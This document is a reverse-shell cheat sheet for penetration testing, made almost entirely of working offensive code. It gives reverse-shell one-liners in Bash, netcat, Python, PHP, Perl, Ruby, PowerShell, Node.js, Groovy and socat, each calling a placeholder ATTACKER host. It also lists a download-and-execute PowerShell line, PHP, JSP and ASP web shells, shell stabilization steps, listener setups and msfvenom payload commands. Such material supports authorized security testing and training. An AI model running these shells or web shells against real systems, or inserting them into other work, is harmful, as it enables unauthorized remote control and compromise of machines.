# Reverse Shell Cheat Sheet

> Replace ATTACKER with your IP and PORT with your listener port.
> Always start listener first: `nc -lvnp PORT` or `rlwrap nc -lvnp PORT`

## Bash

```bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
```

## Netcat

```bash
# Traditional (with -e)
nc -e /bin/bash ATTACKER PORT

# Without -e (most systems)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER PORT >/tmp/f

# Netcat OpenBSD
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f
```

## Python

```python
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## PHP

```bash
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

## Perl

```bash
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PowerShell

```powershell
# One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded (avoid special chars)
# Generate: echo -n 'IEX(...)' | iconv -t UTF-16LE | base64 -w0
# Execute: powershell -enc BASE64_STRING

# Powercat
# IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/powercat.ps1');powercat -c ATTACKER -p PORT -e cmd
```

## Java

```bash
# Runtime.exec
# r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"]); p.waitFor();
```

## Node.js

```javascript
require('child_process').exec('bash -i >& /dev/tcp/ATTACKER/PORT 0>&1')

// Or pure JS:
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",[]);var client=new net.Socket();client.connect(PORT,"ATTACKER",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

## Groovy (Jenkins)

```groovy
String host="ATTACKER";int port=PORT;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

## Socat

```bash
# Attacker (listener with TTY)
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:PORT
```

## Web Shells

```php
# Simple PHP
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>

# Weevely (encrypted)
weevely generate PASSWORD shell.php
weevely http://TARGET/shell.php PASSWORD
```

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%String cmd=request.getParameter("cmd");Process p=Runtime.getRuntime().exec(cmd);Scanner s=new Scanner(p.getInputStream()).useDelimiter("\\A");out.println(s.hasNext()?s.next():"");%>
```

```asp
<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Set r = o.exec("cmd /c " & Request.QueryString("cmd")) : Response.Write(r.StdOut.ReadAll) %>
```

---

## Shell Stabilization

After getting a reverse shell, stabilize it:

```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# or
script -qc /bin/bash /dev/null

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: Fix terminal
stty raw -echo; fg

# Step 4: Set environment
export TERM=xterm
export SHELL=bash
stty rows ROWS cols COLS   # Match your terminal size (run `stty size` locally)
```

## Listener Options

```bash
# Netcat
nc -lvnp PORT
rlwrap nc -lvnp PORT                 # With readline (arrow keys work)

# Socat (full TTY)
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD [payload]; set LHOST ATTACKER; set LPORT PORT; run"

# pwncat (auto-stabilize)
pwncat-cs -lp PORT
```

## msfvenom Payloads

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o meterpreter

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o meterpreter.exe

# Web
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx -o shell.aspx

# Scripting
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f psh -o shell.ps1
```
